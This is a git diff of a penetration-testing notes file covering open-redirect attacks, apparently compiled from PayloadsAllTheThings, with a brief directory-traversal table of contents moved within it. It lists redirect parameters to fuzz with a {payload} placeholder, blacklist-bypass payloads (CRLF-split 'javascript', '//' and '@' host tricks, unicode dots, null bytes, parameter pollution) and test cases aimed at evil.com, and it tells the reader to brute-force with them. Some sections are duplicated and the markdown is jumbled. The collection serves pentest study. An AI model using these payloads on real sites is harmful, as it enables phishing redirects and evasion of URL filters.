@@ -604,6 +604,11 @@ X-Forwarded-Host: internal-admin
 
 ## HTTP Status Code: 3xx, 200
 
+1. **Sort the Parameters Returning a 200 Response:**
+   ```
+   GET /url=https://bing.com/
+   ```
+
 ### Common Parameters List:
 ```
 dest,redirect,?,something is redirect to page
@@ -637,24 +642,54 @@ uri,path,continue,url,window,to,out,view,dir,show,navigation,Open,url,file,val,v
 ?checkout_url={payload}
 ?continue={payload}
 ?return_path={payload}
+?checkout_url={payload}
+?continue={payload}
+?dest={payload}
+?destination={payload}
+?go={payload}
+?image_url={payload}
+?next={payload}
+?redir={payload}
+?redirect_uri={payload}
+?redirect_url={payload}
+?redirect={payload}
+?return_path={payload}
+?return_to={payload}
+?return={payload}
+?returnTo={payload}
+?rurl={payload}
+?target={payload}
+?url={payload}
+?view={payload}
+/{payload}
+/redirect/{payload}
 ```
 
 ### Approach:
-1. **URL Redirection on Path Fragments:**
+1. **### Bypassing Techniques:**
    ```
    example: any.com/payloads
    any.com/bing.com
    any.com//bing.com
    any.com//bing.com/%2e%2e
+   //google.com
+   ////google.com
+   https:google.com
+   Using CRLF to bypass "javascript" blacklisted keyword: java%0d%0ascript%0d%0a:alert(0)
+   Using "//" and "////" to bypass "http" blacklisted keyword:  //google.com, ////google.com
+   Using "https:" to bypass "//" blacklisted keyword: https:google.com
+   Using "\/\/" to bypass "//" blacklisted keyword: \/\/google.com/, /\/google.com/
+   Using "%E3%80%82" to bypass "." blacklisted character: /?redir=google。com, //google%E3%80%82com
+   Using null byte "%00" to bypass blacklist filter:  //google%00.com
+   Using HTTP Parameter Pollution: ?next=whitelisted.com&next=google.com
+   Using "@" character. Common Internet Scheme Syntax: //<user>:<password>@<host>:<port>/<url-path> http://www.theirsite.com@yoursite.com/
+   Creating folder as their domain: http://www.yoursite.com/http://www.theirsite.com/, http://www.yoursite.com/folder/www.folder.com
+   Using "?" character, browser will translate it to "/?": http://www.yoursite.com?http://www.theirsite.com/, http://www.yoursite.com?folder/www.folder.com
+   Host/Split Unicode Normalization: https://evil.c℀.example.com . ---> https://evil.ca/c.example.com, http://a.com／X.b.com
    ```
    Use the payload to attempt a brute-force attack.
 
-2. **Sort the Parameters Returning a 200 Response:**
-   ```
-   GET /url=https://bing.com/
-   ```
 
-### Bypassing Techniques:
 - Using a whitelisted domain or keyword: `https://www.whitelisted.com/evil.com` redirects to `evil.com`
 - Using `//` to bypass `http` blacklisted keyword: `//google.com`
 - Using `https:` to bypass `//` blacklisted keyword: `https:google.com`
@@ -662,28 +697,6 @@ uri,path,continue,url,window,to,out,view,dir,show,navigation,Open,url,file,val,v
 - Using parameter pollution: `?next=whitelisted.com&next=google.com`
 - Using `@` character: `http://www.theirsite.com@yoursite.com/`
 
-**More payloads and techniques:** [PayloadsAllTheThings - Open Redirect](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Open%20Redirect)
-
-https://github.com/Anvesh464/PayloadsAllTheThings/blob/master/Open%20Redirect/README.md 
----
-# Directory Traversal
-
-* [Methodology](#methodology)
-    * [URL Encoding](#url-encoding)
-    * [Double URL Encoding](#double-url-encoding)
-    * [Unicode Encoding](#unicode-encoding)
-    * [Overlong UTF-8 Unicode Encoding](#overlong-utf-8-unicode-encoding)
-    * [Mangled Path](#mangled-path)
-    * [NULL Bytes](#null-bytes)
-    * [Reverse Proxy URL Implementation](#reverse-proxy-url-implementation)
-* [Exploit](#exploit)
-    * [UNC Share](#unc-share)
-    * [ASPNET Cookieless](#asp-net-cookieless)
-    * [IIS Short Name](#iis-short-name)
-    * [Java URL Protocol](#java-url-protocol)
-* [Path Traversal](#path-traversal)
-    * [Linux Files](#linux-files)
-    * [Windows Files](#windows-files)
 ```
 1. Basic External URL Redirect Test**:                   ?next=https://google.com`
 2. HTTP Protocol Injection Test**                        ?redirect=http://example.com`
@@ -706,6 +719,24 @@ https://github.com/Anvesh464/PayloadsAllTheThings/blob/master/Open%20Redirect/RE
 19. Fragment Identifier Bypass Test**                    ?redirect=https://evil.com#test`
 20. Open Redirect via JSON Body**                         json  {"redirect":"https://evil.com"}
 ```
+# Directory Traversal
+
+* [Methodology](#methodology)
+    * [URL Encoding](#url-encoding)
+    * [Double URL Encoding](#double-url-encoding)
+    * [Unicode Encoding](#unicode-encoding)
+    * [Overlong UTF-8 Unicode Encoding](#overlong-utf-8-unicode-encoding)
+    * [Mangled Path](#mangled-path)
+    * [NULL Bytes](#null-bytes)
+    * [Reverse Proxy URL Implementation](#reverse-proxy-url-implementation)
+* [Exploit](#exploit)
+    * [UNC Share](#unc-share)
+    * [ASPNET Cookieless](#asp-net-cookieless)
+    * [IIS Short Name](#iis-short-name)
+    * [Java URL Protocol](#java-url-protocol)
+* [Path Traversal](#path-traversal)
+    * [Linux Files](#linux-files)
+    * [Windows Files](#windows-files)
 * [wireghoul/dotdotpwn](https://github.com/wireghoul/dotdotpwn) - The Directory Traversal Fuzzer
 
     ```powershell
